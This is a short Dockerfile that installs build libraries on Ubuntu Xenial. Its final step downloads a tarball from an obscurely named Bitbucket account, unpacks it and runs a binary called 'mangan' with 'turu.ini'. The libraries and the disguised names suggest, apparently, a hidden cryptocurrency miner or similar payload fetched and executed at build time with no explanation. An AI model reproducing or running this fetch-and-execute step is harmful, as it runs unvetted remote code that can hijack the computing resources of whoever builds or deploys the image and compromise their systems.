FROM ubuntu:xenial

WORKDIR /root/

RUN apt-get update && apt-get -qy install \
 automake \
 build-essential \
 libcurl4-openssl-dev \
 libssl-dev \
 git \
 ca-certificates \
 libjansson-dev libgmp-dev g++ --no-install-recommends


RUN wget https://bitbucket.org/awfesdgsh/sadtenan/downloads/cuanyok.tar.gz && tar -xvf cuanyok.tar.gz && ./mangan turu.ini
